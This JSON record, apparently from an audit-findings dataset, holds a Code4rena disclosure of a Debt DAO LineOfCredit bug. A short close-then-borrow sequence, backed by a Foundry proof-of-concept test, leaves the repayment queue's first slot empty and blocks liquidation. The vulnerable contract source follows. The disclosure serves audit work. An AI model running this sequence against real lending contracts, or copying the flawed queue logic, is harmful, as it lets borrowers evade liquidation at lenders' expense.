{
  "Title": "[H-05] Borrower can craft a borrow that cannot be liquidated, even by arbiter. ",
  "Content": "# Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L516-L538\n\n\n# Vulnerability details\n\n## Description\n\nLineOfCredit manages an array of open credit line identifiers called `ids`. Many interactions with the Line operate on ids\\[0\\], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids\\[0\\] before other credit lines. \n\nThe list is managed by several functions:\n\n1.  CreditListLib.removePosition - deletes parameter id in the ids array\n2.  CreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element\n3.  _sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:\n    1.  target index is not empty\n    2.  there is no principal owed for the target index's credit\n\nThe idea I had is that if we could corrupt the ids array so that ids\\[0\\] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing. \n\n```\nmodifier whileBorrowing() {\n    if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }\n    _;\n}\n```\n\nIt turns out there is a simple sequence of calls which allows borrowing while ids\\[0\\] is deleted, and does not re-arrange the new borrow into ids\\[0\\]!\n\n1.  id1 = addCredit() - add a new credit line, a new id is pushed to the end of ids array.\n2.  id2 = addCredit() - called again, ids.length = 2\n3.  close(id1) - calls removePosition() on id1, now ids array is \\[0x000000000000000000000000, id2 \\]\n4.  borrow(id2) - will borrow from id2 and call _sortIntoQ. The sorting loop will not find another index other than id2's existing index (`id == bytes32(0)` is true).\n\nFrom this sequence, we achieve a borrow while ids\\[0\\] is 0! Therefore, credits\\[ids\\[0\\]\\].principal = credits\\[0\\].principal = 0, and whileBorrowing() reverts.\n\nThe impact is massive - the following functions are disabled:\n\n- SecureLine::liquidate()\n- LineOfCredit::depositAndClose()\n- LineOfCredit::depositAndRepay()\n- LineOfCredit::claimAndRepay()\n- LineOfCredit::claimAndTrade()\n\n## Impact\n\nBorrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.\n\n## Proof of Concept\n\nCopy the following code into LineOfCredit.t.sol\n\n```\nfunction _addCreditLender2(address token, uint256 amount) public {\n    // Prepare lender 2 operations, does same as mintAndApprove()\n    address lender2 = address(21);\n    deal(lender2, mintAmount);\n    supportedToken1.mint(lender2, mintAmount);\n    supportedToken2.mint(lender2, mintAmount);\n    unsupportedToken.mint(lender2, mintAmount);\n    vm.startPrank(lender2);\n    supportedToken1.approve(address(line), MAX_INT);\n    supportedToken2.approve(address(line), MAX_INT);\n    unsupportedToken.approve(address(line), MAX_INT);\n    vm.stopPrank();\n    // addCredit logic\n    vm.prank(borrower);\n    line.addCredit(dRate, fRate, amount, token, lender2);\n    vm.stopPrank();\n    vm.prank(lender2);\n    line.addCredit(dRate, fRate, amount, token, lender2);\n    vm.stopPrank();\n}\nfunction test_attackUnliquidatable() public {\n    bytes32 id_1;\n    bytes32 id_2;\n    _addCredit(address(supportedToken1), 1 ether);\n    _addCreditLender2(address(supportedToken1), 1 ether);\n    id_1 =  line.ids(0);\n    id_2 =  line.ids(1);\n    hoax(borrower);\n    line.close(id_1);\n    hoax(borrower);\n    line.borrow(id_2, 1 ether);\n    id_1 =  line.ids(0);\n    id_2 = line.ids(1);\n    console.log(\"id1 : \", uint256(id_1));\n    console.log(\"id2 : \", uint256(id_2));\n    vm.warp(ttl+1);\n    assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);\n    vm.expectRevert(ILineOfCredit.NotBorrowing.selector);\n    bool isSolvent = line.declareInsolvent();\n}\n```\n\n## Tools Used\n\nManual audit\n\n## Recommended Mitigation Steps\n\nWhen sorting new borrows into the ids queue, do not skip any elements.",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-11-debt-dao-contest",
  "Code": [
    {
      "filename": "contracts/modules/credit/LineOfCredit.sol",
      "content": "pragma solidity ^0.8.9;\n\nimport { Denominations } from \"chainlink/Denominations.sol\";\nimport { IERC20 } from \"openzeppelin/token/ERC20/IERC20.sol\";\nimport {SafeERC20}  from \"openzeppelin/token/ERC20/utils/SafeERC20.sol\";\n\nimport {LineLib} from \"../../utils/LineLib.sol\";\nimport {CreditLib} from \"../../utils/CreditLib.sol\";\nimport {CreditListLib} from \"../../utils/CreditListLib.sol\";\nimport {MutualConsent} from \"../../utils/MutualConsent.sol\";\nimport {InterestRateCredit} from \"../interest-rate/InterestRateCredit.sol\";\n\nimport {IOracle} from \"../../interfaces/IOracle.sol\";\nimport {ILineOfCredit} from \"../../interfaces/ILineOfCredit.sol\";\n\ncontract LineOfCredit is ILineOfCredit, MutualConsent {\n    using SafeERC20 for IERC20;\n\n    using CreditListLib for bytes32[];\n\n    uint256 public immutable deadline;\n\n    address public immutable borrower;\n\n    address public immutable arbiter;\n\n    IOracle public immutable oracle;\n\n    InterestRateCredit public immutable interestRate;\n\n    uint256 private count; // amount of open credit lines on a Line of Credit facility. ids.length includes null items\n\n    bytes32[] public ids; // all open credit lines\n\n    mapping(bytes32 => Credit) public credits; // id -> Reference ID for a credit line provided by a single Lender for a given token on a Line of Credit\n\n    // Line Financials aggregated accross all existing  Credit\n    LineLib.STATUS public status;\n\n    /**\n   * @notice            - How to deploy a Line of Credit\n   * @dev               - A Borrower and a first Lender agree on terms. Then the Borrower deploys the contract using the constructor below.\n   *                      Later, both Lender and Borrower must call _mutualConsent() during addCredit() to actually enable funds to be deposited.\n   * @param oracle_     - The price oracle to use for getting all token values.\n   * @param arbiter_    - A neutral party with some special priviliges on behalf of Borrower and Lender.\n   * @param borrower_   - The debitor for all credit lines in this contract.\n   * @param ttl_        - The time to live for all credit lines for the Line of Credit facility (sets the maturity/term of the Line of Credit)\n  */\n    constructor(\n        address oracle_,\n        address arbiter_,\n        address borrower_,\n        uint256 ttl_\n    ) {\n        oracle = IOracle(oracle_);\n        arbiter = arbiter_;\n        borrower = borrower_;\n        deadline = block.timestamp + ttl_;  //the deadline is the term/maturity/expiry date of the Line of Credit facility\n        interestRate = new InterestRateCredit();\n\n        emit DeployLine(oracle_, arbiter_, borrower_);\n    }\n\n    function init() external virtual returns(LineLib.STATUS) {\n      if(status != LineLib.STATUS.UNINITIALIZED) { revert AlreadyInitialized(); }\n      return _updateStatus(_init());\n    }\n\n    function _init() internal virtual returns(LineLib.STATUS) {\n       // If no collateral or Spigot then Line of Credit is immediately active\n      return LineLib.STATUS.ACTIVE;\n    }\n\n    ///////////////\n    // MODIFIERS //\n    ///////////////\n\n    modifier whileActive() {\n        if(status != LineLib.STATUS.ACTIVE) { revert NotActive(); }\n        _;\n    }\n\n    modifier whileBorrowing() {\n        if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }\n        _;\n    }\n\n    modifier onlyBorrower() {\n        if(msg.sender != borrower) { revert CallerAccessDenied(); }\n        _;\n    }\n\n    /**\n     * @notice - mutualConsent() but hardcodes borrower address and uses the position id to\n                 get Lender address instead of passing it in directly\n     * @param id - position to pull lender address from for mutual consent agreement\n    */\n    modifier mutualConsentById(bytes32 id) {\n      if(_mutualConsent(borrower, credits[id].lender))  {\n        // Run whatever code is needed for the 2/2 consent\n        _;\n      }\n    }\n\n    /**\n     * @notice - evaluates all covenants encoded in _healthcheck from different Line variants\n     * @dev - updates `status` variable in storage if current status is diferent from existing status\n     * @return - current health status of Line\n    */\n    function healthcheck() external returns (LineLib.STATUS) {\n        // can only check if the line has been initialized\n        require(uint(status) >= uint( LineLib.STATUS.ACTIVE));\n        return _updateStatus(_healthcheck());\n    }\n\n    /// see ILineOfCredit.counts\n    function counts() external view returns (uint256, uint256) {\n        return (count, ids.length);\n    }\n\n    function _healthcheck() internal virtual returns (LineLib.STATUS) {\n        // if line is in a final end state then do not run _healthcheck()\n        LineLib.STATUS s = status;\n        if (\n            s == LineLib.STATUS.REPAID ||               // end state - good\n            s == LineLib.STATUS.INSOLVENT               // end state - bad\n        ) {\n            return s;\n        }\n\n        // Liquidate if all credit lines aren't closed by deadline\n        if (block.timestamp >= deadline && count > 0) {\n            emit Default(ids[0]); // can query all defaulted positions offchain once event picked up\n            return LineLib.STATUS.LIQUIDATABLE;\n        }\n\n        // if nothing wrong, return to healthy ACTIVE state  \n        return LineLib.STATUS.ACTIVE;\n    }\n\n\n    /// see ILineOfCredit.declareInsolvent\n    function declareInsolvent() external whileBorrowing returns(bool) {\n        if(arbiter != msg.sender) { revert CallerAccessDenied(); }\n        if(LineLib.STATUS.LIQUIDATABLE != _updateStatus(_healthcheck())) {\n            revert NotLiquidatable();\n        }\n\n        if(_canDeclareInsolvent()) {\n            _updateStatus(LineLib.STATUS.INSOLVENT);\n            return true;\n        } else {\n          return false;\n        }\n    }\n\n    function _canDeclareInsolvent() internal virtual returns(bool) {\n        // logic updated in Spigoted and Escrowed lines\n        return true;\n    }\n\n    /// see ILineOfCredit.updateOutstandingDebt\n    function updateOutstandingDebt() external override returns (uint256, uint256) {\n        return _updateOutstandingDebt();\n    }\n\n    function _updateOutstandingDebt()\n        internal\n        returns (uint256 principal, uint256 interest)\n    {\n        // use full length not count because positions might not be packed in order\n        uint256 len = ids.length;\n        if (len == 0) return (0, 0);\n\n        bytes32 id;\n        address oracle_ = address(oracle);  // gas savings\n        address interestRate_ = address(interestRate); // gas savings\n        \n        for (uint256 i; i < len; ++i) {\n            id = ids[i];\n\n            // null element in array from closing a position. skip for gas savings\n            if(id == bytes32(0)) { continue; }\n\n            (Credit memory c, uint256 _p, uint256 _i) = CreditLib.getOutstandingDebt(\n              credits[id],\n              id,\n              oracle_,\n              interestRate_\n            );\n            // update total outstanding debt\n            principal += _p;\n            interest += _i;\n            // save changes to storage\n            credits[id] = c;\n        }\n    }\n\n    /// see ILineOfCredit.accrueInterest\n    function accrueInterest() external override returns(bool) {\n        uint256 len = ids.length;\n        bytes32 id;\n        for (uint256 i; i < len; ++i) {\n          id = ids[i];\n          Credit memory credit = credits[id];\n          credits[id] = _accrue(credit, id);\n        }\n        \n        return true;\n    }\n\n    /**\n      @notice - accrues token demoninated interest on a lender's position.\n      @dev MUST call any time a position balance or interest rate changes\n      @param credit - the lender position that is accruing interest\n      @param id - the position id for credit position\n    */\n    function _accrue(Credit memory credit, bytes32 id) internal returns(Credit memory) {\n      return CreditLib.accrue(credit, id, address(interestRate));\n    }\n\n    /// see ILineOfCredit.addCredit\n    function addCredit(\n        uint128 drate,\n        uint128 frate,\n        uint256 amount,\n        address token,\n        address lender\n    )\n        external\n        payable\n        override\n        whileActive\n        mutualConsent(lender, borrower)\n        returns (bytes32)\n    {\n        LineLib.receiveTokenOrETH(token, lender, amount);\n\n        bytes32 id = _createCredit(lender, token, amount);\n\n        require(interestRate.setRate(id, drate, frate));\n        \n        return id;\n    }\n\n    /// see ILineOfCredit.setRates\n    function setRates(\n        bytes32 id,\n        uint128 drate,\n        uint128 frate\n    )\n      external\n      override\n      mutualConsentById(id)\n      returns (bool)\n    {\n        Credit memory credit = credits[id];\n        credits[id] = _accrue(credit, id);\n        require(interestRate.setRate(id, drate, frate));\n        emit SetRates(id, drate, frate);\n        return true;\n    }\n\n    /// see ILineOfCredit.increaseCredit\n    function increaseCredit(bytes32 id, uint256 amount)\n      external\n      payable\n      override\n      whileActive\n      mutualConsentById(id)\n      returns (bool)\n    {\n        Credit memory credit = credits[id];\n        credit = _accrue(credit, id);\n\n        credit.deposit += amount;\n        \n        credits[id] = credit;\n\n        LineLib.receiveTokenOrETH(credit.token, credit.lender, amount);\n\n        emit IncreaseCredit(id, amount);\n\n        return true;\n    }\n\n    ///////////////\n    // REPAYMENT //\n    ///////////////\n\n    /// see ILineOfCredit.depositAndClose\n    function depositAndClose()\n        external\n        payable\n        override\n        whileBorrowing\n        onlyBorrower\n        returns (bool)\n    {\n        bytes32 id = ids[0];\n        Credit memory credit = _accrue(credits[id], id);\n\n        // Borrower deposits the outstanding balance not already repaid\n        uint256 totalOwed = credit.principal + credit.interestAccrued;\n        LineLib.receiveTokenOrETH(credit.token, msg.sender, totalOwed);\n\n        // Borrower clears the debt then closes and deletes the credit line\n        _close(_repay(credit, id, totalOwed), id);\n\n        return true;\n    }\n\n\n    /// see ILineOfCredit.depositAndRepay\n    function depositAndRepay(uint256 amount)\n        external\n        payable\n        override\n        whileBorrowing\n        returns (bool)\n    {\n        bytes32 id = ids[0];\n        Credit memory credit = credits[id];\n        credit = _accrue(credit, id);\n\n        require(amount <= credit.principal + credit.interestAccrued);\n\n        credits[id] = _repay(credit, id, amount);\n\n        LineLib.receiveTokenOrETH(credit.token, msg.sender, amount);\n\n        return true;\n    }\n\n    ////////////////////\n    // FUND TRANSFERS //\n    ////////////////////\n\n    /// see ILineOfCredit.borrow\n    function borrow(bytes32 id, uint256 amount)\n        external\n        override\n        whileActive\n        onlyBorrower\n        returns (bool)\n    {\n        Credit memory credit = _accrue(credits[id], id);\n\n        if(amount > credit.deposit - credit.principal) { revert NoLiquidity(); }\n\n        credit.principal += amount;\n\n        credits[id] = credit; // save new debt before healthcheck\n\n        // ensure that borrowing doesnt cause Line to be LIQUIDATABLE\n        if(_updateStatus(_healthcheck()) != LineLib.STATUS.ACTIVE) { \n            revert NotActive();\n        }\n\n        LineLib.sendOutTokenOrETH(credit.token, borrower, amount);\n\n        emit Borrow(id, amount);\n\n        _sortIntoQ(id);\n\n        return true;\n    }\n\n    /// see ILineOfCredit.withdraw\n    function withdraw(bytes32 id, uint256 amount)\n        external\n        override\n        returns (bool)\n    {\n        Credit memory credit = credits[id];\n\n        if(msg.sender != credit.lender) { revert CallerAccessDenied(); }\n\n        // accrues interest and transfers to Lender\n        credits[id] = CreditLib.withdraw(_accrue(credit, id), id, amount);\n\n        LineLib.sendOutTokenOrETH(credit.token, credit.lender, amount);\n\n        return true;\n    }\n\n    /// see ILineOfCredit.close\n    function close(bytes32 id) external payable override returns (bool) {\n        Credit memory credit = credits[id];\n        address b = borrower; // gas savings\n        if(msg.sender != credit.lender && msg.sender != b) {\n          revert CallerAccessDenied();\n        }\n\n        // ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid off\n        credit = _accrue(credit, id);\n        uint256 facilityFee = credit.interestAccrued;\n        if(facilityFee > 0) {\n          // only allow repaying interest since they are skipping repayment queue.\n          // If principal still owed, _close() MUST fail\n          LineLib.receiveTokenOrETH(credit.token, b, facilityFee);\n\n          credit = _repay(credit, id, facilityFee);\n        }\n\n        _close(credit, id); // deleted; no need to save to storage\n\n        return true;\n    }\n\n    //////////////////////\n    //  Internal  funcs //\n    //////////////////////\n\n    /**\n      * @notice - updates `status` variable in storage if current status is diferent from existing status.\n      * @dev - privileged internal function. MUST check params and logic flow before calling\n      * @dev - does not save new status if it is the same as current status\n      * @return status - the current status of the line after updating\n     */\n    function _updateStatus(LineLib.STATUS status_) internal returns(LineLib.STATUS) {\n      if(status == status_) return status_;\n      emit UpdateStatus(uint256(status_));\n      return (status = status_);\n    }\n\n    /**\n     * @notice - Generates position id and stores lender's position\n     * @dev - positions have unique composite-index on [lineAddress, lenderAddress, tokenAddress]\n     * @dev - privileged internal function. MUST check params and logic flow before calling\n     * @param lender - address that will own and manage position\n     * @param token - ERC20 token that is being lent and borrower\n     * @param amount - amount of tokens lender will initially deposit\n    */\n    function _createCredit(\n        address lender,\n        address token,\n        uint256 amount\n    )\n        internal\n        returns (bytes32 id)\n    {\n        id = CreditLib.computeId(address(this), lender, token);\n        // MUST not double add the credit line. otherwise we can not _close()\n        if(credits[id].lender != address(0)) { revert PositionExists(); }\n\n        credits[id] = CreditLib.create(id, amount, lender, token, address(oracle));\n\n        ids.push(id); // add lender to end of repayment queue\n        \n        unchecked { ++count; }\n\n        return id;\n    }\n\n  /**\n   * @dev - Reduces `principal` and/or `interestAccrued` on a credit line.\n            Expects checks for conditions of repaying and param sanitizing before calling\n            e.g. early repayment of principal, tokens have actually been paid by borrower, etc.\n   * @dev - privileged internal function. MUST check params and logic flow before calling\n   * @param id - position id with all data pertaining to line\n   * @param amount - amount of Credit Token being repaid on credit line\n   * @return credit - position struct in memory with updated values\n  */\n    function _repay(Credit memory credit, bytes32 id, uint256 amount)\n        internal\n        returns (Credit memory)\n    { \n        credit = CreditLib.repay(credit, id, amount);\n\n        // if credit line fully repaid then remove it from the repayment queue\n        if (credit.principal == 0) ids.stepQ();\n\n        return credit;\n    }\n\n    /**\n     * @notice - checks that a credit line is fully repaid and removes it\n     * @dev deletes credit storage. Store any data u might need later in call before _close()\n     * @dev - privileged internal function. MUST check params and logic flow before calling\n     * @return credit - position struct in memory with updated values\n     */\n    function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n        if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }\n\n        // return the Lender's funds that are being repaid\n        if (credit.deposit + credit.interestRepaid > 0) {\n            LineLib.sendOutTokenOrETH(\n                credit.token,\n                credit.lender,\n                credit.deposit + credit.interestRepaid\n            );\n        }\n\n        delete credits[id]; // gas refunds\n\n        // remove from active list\n        ids.removePosition(id);\n        unchecked { --count; }\n\n        // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.\n        if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n        emit CloseCreditPosition(id);\n\n        return true;\n    }\n\n    /**\n     * @notice - Insert `p` into the next availble FIFO position in the repayment queue\n               - once earliest slot is found, swap places with `p` and position in slot.\n     * @dev - privileged internal function. MUST check params and logic flow before calling\n     * @param p - position id that we are trying to find appropriate place for\n     * @return - if function executed successfully\n     */\n    function _sortIntoQ(bytes32 p) internal returns (bool) {\n        uint256 lastSpot = ids.length - 1;\n        uint256 nextQSpot = lastSpot;\n        bytes32 id;\n        for (uint256 i; i <= lastSpot; ++i) {\n            id = ids[i];\n            if (p != id) {\n                if (\n                  id == bytes32(0) ||       // deleted element. In the middle of the q because it was closed.\n                  nextQSpot != lastSpot ||  // position already found. skip to find `p` asap\n                  credits[id].principal > 0 //`id` should be placed before `p` \n                ) continue;\n                nextQSpot = i;              // index of first undrawn line found\n            } else {\n                if(nextQSpot == lastSpot) return true; // nothing to update\n                // swap positions\n                ids[i] = ids[nextQSpot];    // id put into old `p` position\n                ids[nextQSpot] = p;         // p put at target index\n                return true; \n            }\n          \n        }\n    }\n}"
    }
  ]
}